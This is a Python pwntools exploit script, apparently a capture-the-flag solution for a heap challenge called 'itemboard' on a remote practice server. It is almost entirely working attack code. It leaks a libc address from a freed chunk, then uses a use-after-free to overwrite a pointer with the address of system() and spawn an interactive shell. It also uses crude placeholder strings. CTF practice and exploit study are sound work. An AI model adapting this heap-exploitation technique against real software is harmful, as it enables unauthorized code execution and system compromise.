#!/usr/bin/env python2
from pwn import *

ready = True
if ready:
    conn = remote('pwn2.jarvisoj.com', 9887)
else:
    # use libc x64 2.23
    conn = process(['/home/doublesine/Desktop/itemboard'])

def new_item(name, description_len, description):
    conn.sendline('1')
    print conn.read(),
    conn.sendline(name)
    print conn.read(),
    conn.sendline('%d' % description_len)
    print conn.read(),
    conn.sendline(description)
    print conn.readline(),

def show_item(i):
    conn.sendline('3')
    print conn.readline(),
    conn.sendline('%d' % i)
    print conn.readuntil('Name:'),
    name = conn.readline()
    print name,
    print conn.readuntil('Description:'),
    description = conn.readline()
    print description,

    return name[:-1], description[:-1]

def remove_item(i):
    conn.sendline('4')
    print conn.readline(),
    conn.sendline('%d' % i)
    print conn.readline(),

# leak libc address
print conn.read(),
new_item('fuck', 0x100, 'fuck') # 0
print conn.read(),
new_item('fuck', 0x100, 'fuck') # 1
print conn.read(),
remove_item(0)
print conn.read(),
name, desc = show_item(0)
libc_main_arena = unpack(desc + '\x00' * (8 - len(desc)), 64)
libc_base_addr = libc_main_arena - (0x3BE7B8 if ready else 0x3C4B78)
libc_system_addr = libc_base_addr + (0x46590 if ready else 0x45390)
log.info('libc_main_arena = 0x%016x' % libc_main_arena)
log.info('libc_base_addr = 0x%016x' % libc_base_addr)
log.info('libc_system_addr = 0x%016x' % libc_system_addr)

# uaf:
print conn.read(),
new_item('fuck', 0x40, 'fuck')  # 2
print conn.read(),
new_item('fuck', 0x40, 'fuck')  # 3
# 1. free 
print conn.read(),
remove_item(2)
print conn.read(),
remove_item(3)
# 2. modify item2
print conn.read(),
new_item('fuck', 0x18, '/bin//sh' + '||echo A' + pack(libc_system_addr, 64))  # 4

# 3. use item2
print conn.read(),
conn.sendline('4')
print conn.readline(),
conn.sendline('2')

# get shell
conn.interactive()
